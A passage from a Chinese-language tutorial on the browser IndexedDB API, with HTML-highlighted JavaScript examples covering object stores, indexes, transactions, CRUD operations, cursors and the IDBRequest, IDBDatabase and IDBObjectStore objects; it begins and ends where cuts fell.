<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded &#x3D; function (event) &#123;</span><br><span class="line">  db &#x3D; event.target.result;</span><br><span class="line">  var objectStore;</span><br><span class="line">  if (!db.objectStoreNames.contains(&#39;person&#39;)) &#123;</span><br><span class="line">    objectStore &#x3D; db.createObjectStore(&#39;person&#39;, &#123; keyPath: &#39;id&#39; &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主键（key）是默认建立索引的属性。比如，数据记录是<code>{ id: 1, name: &#39;张三&#39; }</code>，那么<code>id</code>属性可以作为主键。主键也可以指定为下一层对象的属性，比如<code>{ foo: { bar: &#39;baz&#39; } }</code>的<code>foo.bar</code>也可以指定为主键。</p>
<p>如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var objectStore &#x3D; db.createObjectStore(</span><br><span class="line">  &#39;person&#39;,</span><br><span class="line">  &#123; autoIncrement: true &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码中，指定主键为一个递增的整数。</p>
<p>新建对象仓库以后，下一步可以新建索引。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded &#x3D; function(event) &#123;</span><br><span class="line">  db &#x3D; event.target.result;</span><br><span class="line">  var objectStore &#x3D; db.createObjectStore(&#39;person&#39;, &#123; keyPath: &#39;id&#39; &#125;);</span><br><span class="line">  objectStore.createIndex(&#39;name&#39;, &#39;name&#39;, &#123; unique: false &#125;);</span><br><span class="line">  objectStore.createIndex(&#39;email&#39;, &#39;email&#39;, &#123; unique: true &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>IDBObject.createIndex()</code>的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。</p>
<h4 id="新增数据"><a href="#新增数据" class="headerlink" title="新增数据"></a>新增数据</h4><p>新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function add() &#123;</span><br><span class="line">  var request &#x3D; db.transaction([&#39;person&#39;], &#39;readwrite&#39;)</span><br><span class="line">    .objectStore(&#39;person&#39;)</span><br><span class="line">    .add(&#123; id: 1, name: &#39;张三&#39;, age: 24, email: &#39;zhangsan@example.com&#39; &#125;);</span><br><span class="line"></span><br><span class="line">  request.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;数据写入成功&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.onerror &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;数据写入失败&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add();</span><br></pre></td></tr></table></figure>

<p>上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过<code>IDBTransaction.objectStore(name)</code>方法，拿到 IDBObjectStore 对象，再通过表格对象的<code>add()</code>方法，向表格写入一条记录。</p>
<p>写入操作是一个异步操作，通过监听连接对象的<code>success</code>事件和<code>error</code>事件，了解是否写入成功。</p>
<h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>读取数据也是通过事务完成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function read() &#123;</span><br><span class="line">   var transaction &#x3D; db.transaction([&#39;person&#39;]);</span><br><span class="line">   var objectStore &#x3D; transaction.objectStore(&#39;person&#39;);</span><br><span class="line">   var request &#x3D; objectStore.get(1);</span><br><span class="line"></span><br><span class="line">   request.onerror &#x3D; function(event) &#123;</span><br><span class="line">     console.log(&#39;事务失败&#39;);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   request.onsuccess &#x3D; function( event) &#123;</span><br><span class="line">      if (request.result) &#123;</span><br><span class="line">        console.log(&#39;Name: &#39; + request.result.name);</span><br><span class="line">        console.log(&#39;Age: &#39; + request.result.age);</span><br><span class="line">        console.log(&#39;Email: &#39; + request.result.email);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        console.log(&#39;未获得数据记录&#39;);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read();</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>objectStore.get()</code>方法用于读取数据，参数是主键的值。</p>
<h4 id="遍历数据"><a href="#遍历数据" class="headerlink" title="遍历数据"></a>遍历数据</h4><p>遍历数据表格的所有记录，要使用指针对象 IDBCursor。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function readAll() &#123;</span><br><span class="line">  var objectStore &#x3D; db.transaction(&#39;person&#39;).objectStore(&#39;person&#39;);</span><br><span class="line"></span><br><span class="line">   objectStore.openCursor().onsuccess &#x3D; function (event) &#123;</span><br><span class="line">     var cursor &#x3D; event.target.result;</span><br><span class="line"></span><br><span class="line">     if (cursor) &#123;</span><br><span class="line">       console.log(&#39;Id: &#39; + cursor.key);</span><br><span class="line">       console.log(&#39;Name: &#39; + cursor.value.name);</span><br><span class="line">       console.log(&#39;Age: &#39; + cursor.value.age);</span><br><span class="line">       console.log(&#39;Email: &#39; + cursor.value.email);</span><br><span class="line">       cursor.continue();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.log(&#39;没有更多数据了！&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">readAll();</span><br></pre></td></tr></table></figure>

<p>上面代码中，新建指针对象的<code>openCursor()</code>方法是一个异步操作，所以要监听<code>success</code>事件。</p>
<h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>更新数据要使用<code>IDBObject.put()</code>方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function update() &#123;</span><br><span class="line">  var request &#x3D; db.transaction([&#39;person&#39;], &#39;readwrite&#39;)</span><br><span class="line">    .objectStore(&#39;person&#39;)</span><br><span class="line">    .put(&#123; id: 1, name: &#39;李四&#39;, age: 35, email: &#39;lisi@example.com&#39; &#125;);</span><br><span class="line"></span><br><span class="line">  request.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;数据更新成功&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.onerror &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;数据更新失败&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">update();</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>put()</code>方法自动更新了主键为<code>1</code>的记录。</p>
<h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p><code>IDBObjectStore.delete()</code>方法用于删除记录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function remove() &#123;</span><br><span class="line">  var request &#x3D; db.transaction([&#39;person&#39;], &#39;readwrite&#39;)</span><br><span class="line">    .objectStore(&#39;person&#39;)</span><br><span class="line">    .delete(1);</span><br><span class="line"></span><br><span class="line">  request.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;数据删除成功&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">remove();</span><br></pre></td></tr></table></figure>

<h4 id="使用索引"><a href="#使用索引" class="headerlink" title="使用索引"></a>使用索引</h4><p>索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。</p>
<p>假定新建表格的时候，对<code>name</code>字段建立了索引。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.createIndex(&#39;name&#39;, &#39;name&#39;, &#123; unique: false &#125;);</span><br></pre></td></tr></table></figure>

<p>现在，就可以从<code>name</code>找到对应的数据记录了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var transaction &#x3D; db.transaction([&#39;person&#39;], &#39;readonly&#39;);</span><br><span class="line">var store &#x3D; transaction.objectStore(&#39;person&#39;);</span><br><span class="line">var index &#x3D; store.index(&#39;name&#39;);</span><br><span class="line">var request &#x3D; index.get(&#39;李四&#39;);</span><br><span class="line"></span><br><span class="line">request.onsuccess &#x3D; function (e) &#123;</span><br><span class="line">  var result &#x3D; e.target.result;</span><br><span class="line">  if (result) &#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="indexedDB-对象"><a href="#indexedDB-对象" class="headerlink" title="indexedDB 对象"></a>indexedDB 对象</h3><p>浏览器原生提供<code>indexedDB</code>对象，作为开发者的操作接口。</p>
<h4 id="indexedDB-open"><a href="#indexedDB-open" class="headerlink" title="indexedDB.open()"></a>indexedDB.open()</h4><p><code>indexedDB.open()</code>方法用于打开数据库。这是一个异步操作，但是会立刻返回一个 IDBOpenDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var openRequest &#x3D; window.indexedDB.open(&#39;test&#39;, 1);</span><br></pre></td></tr></table></figure>

<p>上面代码表示，打开一个名为<code>test</code>、版本为<code>1</code>的数据库。如果该数据库不存在，则会新建该数据库。</p>
<p><code>open()</code>方法的第一个参数是数据库名称，格式为字符串，不可省略；第二个参数是数据库版本，是一个大于<code>0</code>的正整数（<code>0</code>将报错），如果该参数大于当前版本，会触发数据库升级。第二个参数可省略，如果数据库已存在，将打开当前版本的数据库；如果数据库不存在，将创建该版本的数据库，默认版本为<code>1</code>。</p>
<p>打开数据库是异步操作，通过各种事件通知客户端。下面是有可能触发的4种事件。</p>
<ul>
<li><strong>success</strong>：打开成功。</li>
<li><strong>error</strong>：打开失败。</li>
<li><strong>upgradeneeded</strong>：第一次打开该数据库，或者数据库版本发生变化。</li>
<li><strong>blocked</strong>：上一次的数据库连接还未关闭。</li>
</ul>
<p>第一次打开数据库时，会先触发<code>upgradeneeded</code>事件，然后触发<code>success</code>事件。</p>
<p>根据不同的需要，对上面4种事件监听函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var openRequest &#x3D; indexedDB.open(&#39;test&#39;, 1);</span><br><span class="line">var db;</span><br><span class="line"></span><br><span class="line">openRequest.onupgradeneeded &#x3D; function (e) &#123;</span><br><span class="line">  console.log(&#39;Upgrading...&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">openRequest.onsuccess &#x3D; function (e) &#123;</span><br><span class="line">  console.log(&#39;Success!&#39;);</span><br><span class="line">  db &#x3D; openRequest.result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">openRequest.onerror &#x3D; function (e) &#123;</span><br><span class="line">  console.log(&#39;Error&#39;);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码有两个地方需要注意。首先，<code>open()</code>方法返回的是一个对象（IDBOpenDBRequest），监听函数就定义在这个对象上面。其次，<code>success</code>事件发生后，从<code>openRequest.result</code>属性可以拿到已经打开的<code>IndexedDB</code>数据库对象。</p>
<h4 id="indexedDB-deleteDatabase"><a href="#indexedDB-deleteDatabase" class="headerlink" title="indexedDB.deleteDatabase()"></a>indexedDB.deleteDatabase()</h4><p><code>indexedDB.deleteDatabase()</code>方法用于删除一个数据库，参数为数据库的名字。它会立刻返回一个<code>IDBOpenDBRequest</code>对象，然后对数据库执行异步删除。删除操作的结果会通过事件通知，<code>IDBOpenDBRequest</code>对象可以监听以下事件。</p>
<ul>
<li><code>success</code>：删除成功</li>
<li><code>error</code>：删除报错</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var DBDeleteRequest &#x3D; window.indexedDB.deleteDatabase(&#39;demo&#39;);</span><br><span class="line"></span><br><span class="line">DBDeleteRequest.onerror &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;Error&#39;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DBDeleteRequest.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;success&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>调用<code>deleteDatabase()</code>方法以后，当前数据库的其他已经打开的连接都会接收到<code>versionchange</code>事件。</p>
<p>注意，删除不存在的数据库并不会报错。</p>
<h4 id="indexedDB-cmp"><a href="#indexedDB-cmp" class="headerlink" title="indexedDB.cmp()"></a>indexedDB.cmp()</h4><p><code>indexedDB.cmp()</code>方法比较两个值是否为 indexedDB 的相同的主键。它返回一个整数，表示比较的结果：<code>0</code>表示相同，<code>1</code>表示第一个主键大于第二个主键，<code>-1</code>表示第一个主键小于第二个主键。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.indexedDB.cmp(1, 2) &#x2F;&#x2F; -1</span><br></pre></td></tr></table></figure>

<p>注意，这个方法不能用来比较任意的 JavaScript 值。如果参数是布尔值或对象，它会报错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.indexedDB.cmp(1, true) &#x2F;&#x2F; 报错</span><br><span class="line">window.indexedDB.cmp(&#123;&#125;, &#123;&#125;) &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<h3 id="IDBRequest-对象"><a href="#IDBRequest-对象" class="headerlink" title="IDBRequest 对象"></a>IDBRequest 对象</h3><p>IDBRequest 对象表示打开的数据库连接，<code>indexedDB.open()</code>方法和<code>indexedDB.deleteDatabase()</code>方法会返回这个对象。数据库的操作都是通过这个对象完成的。</p>
<p>这个对象的所有操作都是异步操作，要通过<code>readyState</code>属性判断是否完成，如果为<code>pending</code>就表示操作正在进行，如果为<code>done</code>就表示操作完成，可能成功也可能失败。</p>
<p>操作完成以后，触发<code>success</code>事件或<code>error</code>事件，这时可以通过<code>result</code>属性和<code>error</code>属性拿到操作结果。如果在<code>pending</code>阶段，就去读取这两个属性，是会报错的。</p>
<p>IDBRequest 对象有以下属性。</p>
<ul>
<li><code>IDBRequest.readyState</code>：等于<code>pending</code>表示操作正在进行，等于<code>done</code>表示操作正在完成。</li>
<li><code>IDBRequest.result</code>：返回请求的结果。如果请求失败、结果不可用，读取该属性会报错。</li>
<li><code>IDBRequest.error</code>：请求失败时，返回错误对象。</li>
<li><code>IDBRequest.source</code>：返回请求的来源（比如索引对象或 ObjectStore）。</li>
<li><code>IDBRequest.transaction</code>：返回当前请求正在进行的事务，如果不包含事务，返回<code>null</code>。</li>
<li><code>IDBRequest.onsuccess</code>：指定<code>success</code>事件的监听函数。</li>
<li><code>IDBRequest.onerror</code>：指定<code>error</code>事件的监听函数。</li>
</ul>
<p>IDBOpenDBRequest 对象继承了 IDBRequest 对象，提供了两个额外的事件监听属性。</p>
<ul>
<li><code>IDBOpenDBRequest.onblocked</code>：指定<code>blocked</code>事件（<code>upgradeneeded</code>事件触发时，数据库仍然在使用）的监听函数。</li>
<li><code>IDBOpenDBRequest.onupgradeneeded</code>：<code>upgradeneeded</code>事件的监听函数。</li>
</ul>
<h3 id="IDBDatabase-对象"><a href="#IDBDatabase-对象" class="headerlink" title="IDBDatabase 对象"></a>IDBDatabase 对象</h3><p>打开数据成功以后，可以从<code>IDBOpenDBRequest</code>对象的<code>result</code>属性上面，拿到一个<code>IDBDatabase</code>对象，它表示连接的数据库。后面对数据库的操作，都通过这个对象完成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line">var DBOpenRequest &#x3D; window.indexedDB.open(&#39;demo&#39;, 1);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onerror &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;Error&#39;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess &#x3D; function(event) &#123;</span><br><span class="line">  db &#x3D; DBOpenRequest.result;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="属性-2"><a href="#属性-2" class="headerlink" title="属性"></a>属性</h4><p>IDBDatabase 对象有以下属性。</p>
<ul>
<li><code>IDBDatabase.name</code>：字符串，数据库名称。</li>
<li><code>IDBDatabase.version</code>：整数，数据库版本。数据库第一次创建时，该属性为空字符串。</li>
<li><code>IDBDatabase.objectStoreNames</code>：DOMStringList 对象（字符串的集合），包含当前数据的所有 object store 的名字。</li>
<li><code>IDBDatabase.onabort</code>：指定 abort 事件（事务中止）的监听函数。</li>
<li><code>IDBDatabase.onclose</code>：指定 close 事件（数据库意外关闭）的监听函数。</li>
<li><code>IDBDatabase.onerror</code>：指定 error 事件（访问数据库失败）的监听函数。</li>
<li><code>IDBDatabase.onversionchange</code>：数据库版本变化时触发（发生<code>upgradeneeded</code>事件，或调用<code>indexedDB.deleteDatabase()</code>）。</li>
</ul>
<p>下面是<code>objectStoreNames</code>属性的例子。该属性返回一个 DOMStringList 对象，包含了当前数据库所有对象仓库的名称（即表名），可以使用 DOMStringList 对象的<code>contains</code>方法，检查数据库是否包含某个对象仓库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!db.objectStoreNames.contains(&#39;firstOS&#39;)) &#123;</span><br><span class="line">  db.createObjectStore(&#39;firstOS&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码先判断某个对象仓库是否存在，如果不存在就创建该对象仓库。</p>
<h4 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h4><p>IDBDatabase 对象有以下方法。</p>
<ul>
<li><code>IDBDatabase.close()</code>：关闭数据库连接，实际会等所有事务完成后再关闭。</li>
<li><code>IDBDatabase.createObjectStore()</code>：创建存放数据的对象仓库，类似于传统关系型数据库的表格，返回一个 IDBObjectStore 对象。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>
<li><code>IDBDatabase.deleteObjectStore()</code>：删除指定的对象仓库。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>
<li><code>IDBDatabase.transaction()</code>：返回一个 IDBTransaction 事务对象。</li>
</ul>
<p>下面是<code>createObjectStore()</code>方法的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var request &#x3D; window.indexedDB.open(&#39;demo&#39;, 2);</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded &#x3D; function (event) &#123;</span><br><span class="line">  var db &#x3D; event.target.result;</span><br><span class="line"></span><br><span class="line">  db.onerror &#x3D; function(event) &#123;</span><br><span class="line">    console.log(&#39;error&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var objectStore &#x3D; db.createObjectStore(&#39;items&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码创建了一个名为<code>items</code>的对象仓库，如果该对象仓库已经存在，就会抛出一个错误。为了避免出错，需要用到下文的<code>objectStoreNames</code>属性，检查已有哪些对象仓库。</p>
<p><code>createObjectStore()</code>方法还可以接受第二个对象参数，用来设置对象仓库的属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.createObjectStore(&#39;test&#39;, &#123; keyPath: &#39;email&#39; &#125;);</span><br><span class="line">db.createObjectStore(&#39;test2&#39;, &#123; autoIncrement: true &#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>keyPath</code>属性表示主键（由于主键的值不能重复，所以上例存入之前，必须保证数据的<code>email</code>属性值都是不一样的），默认值为<code>null</code>；<code>autoIncrement</code>属性表示，是否使用自动递增的整数作为主键（第一个数据记录为1，第二个数据记录为2，以此类推），默认为<code>false</code>。一般来说，<code>keyPath</code>和<code>autoIncrement</code>属性只要使用一个就够了，如果两个同时使用，表示主键为递增的整数，且对象不得缺少<code>keyPath</code>指定的属性。</p>
<p>下面是<code>deleteObjectStore()</code>方法的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var dbName &#x3D; &#39;sampleDB&#39;;</span><br><span class="line">var dbVersion &#x3D; 2;</span><br><span class="line">var request &#x3D; indexedDB.open(dbName, dbVersion);</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded &#x3D; function(e) &#123;</span><br><span class="line">  var db &#x3D; request.result;</span><br><span class="line">  if (e.oldVersion &lt; 1) &#123;</span><br><span class="line">    db.createObjectStore(&#39;store1&#39;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (e.oldVersion &lt; 2) &#123;</span><br><span class="line">    db.deleteObjectStore(&#39;store1&#39;);</span><br><span class="line">    db.createObjectStore(&#39;store2&#39;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>下面是<code>transaction()</code>方法的例子，该方法用于创建一个数据库事务，返回一个 IDBTransaction 对象。向数据库添加数据之前，必须先创建数据库事务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var t &#x3D; db.transaction([&#39;items&#39;], &#39;readwrite&#39;);</span><br></pre></td></tr></table></figure>

<p><code>transaction()</code>方法接受两个参数：第一个参数是一个数组，里面是所涉及的对象仓库，通常是只有一个；第二个参数是一个表示操作类型的字符串。目前，操作类型只有两种：<code>readonly</code>（只读）和<code>readwrite</code>（读写）。添加数据使用<code>readwrite</code>，读取数据使用<code>readonly</code>。第二个参数是可选的，省略时默认为<code>readonly</code>模式。</p>
<h3 id="IDBObjectStore-对象"><a href="#IDBObjectStore-对象" class="headerlink" title="IDBObjectStore 对象"></a>IDBObjectStore 对象</h3><p>IDBObjectStore 对象对应一个对象仓库（object store）。<code>IDBDatabase.createObjectStore()</code>方法返回的就是一个 IDBObjectStore 对象。</p>
<p>IDBDatabase 对象的<code>transaction()</code>返回一个事务对象，该对象的<code>objectStore()</code>方法返回 IDBObjectStore 对象，因此可以采用下面的链式写法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.transaction([&#39;test&#39;], &#39;readonly&#39;)</span><br><span class="line">  .objectStore(&#39;test&#39;)</span><br><span class="line">  .get(X)</span><br><span class="line">  .onsuccess &#x3D; function (e) &#123;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="属性-3"><a href="#属性-3" class="headerlink" title="属性"></a>属性</h4><p>IDBObjectStore 对象有以下属性。</p>
<ul>
<li><code>IDBObjectStore.indexNames</code>：返回一个类似数组的对象（DOMStringList），包含了当前对象仓库的所有索引。</li>
<li><code>IDBObjectStore.keyPath</code>：返回当前对象仓库的主键。</li>
<li><code>IDBObjectStore.name</code>：返回当前对象仓库的名称。</li>
<li><code>IDBObjectStore.transaction</code>：返回当前对象仓库所属的事务对象。</li>
<li><code>IDBObjectStore.autoIncrement</code>：布尔值，表示主键是否会自动递增。</li>
</ul>
<h4 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h4><p>IDBObjectStore 对象有以下方法。</p>
<p><strong>（1）IDBObjectStore.add()</strong></p>
<p><code>IDBObjectStore.add()</code>用于向对象仓库添加数据，返回一个 IDBRequest 对象。该方法只用于添加数据，如果主键相同会报错，因此更新数据必须使用<code>put()</code>方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.add(value, key)</span><br></pre></td></tr></table></figure>

<p>该方法接受两个参数，第一个参数是键值，第二个参数是主键，该参数可选，如果省略默认为<code>null</code>。</p>
<p>创建事务以后，就可以获取对象仓库，然后使用<code>add()</code>方法往里面添加数据了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line">var DBOpenRequest &#x3D; window.indexedDB.open(&#39;demo&#39;, 1);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  db &#x3D; DBOpenRequest.result;</span><br><span class="line">  var transaction &#x3D; db.transaction([&#39;items&#39;], &#39;readwrite&#39;);</span><br><span class="line"></span><br><span class="line">  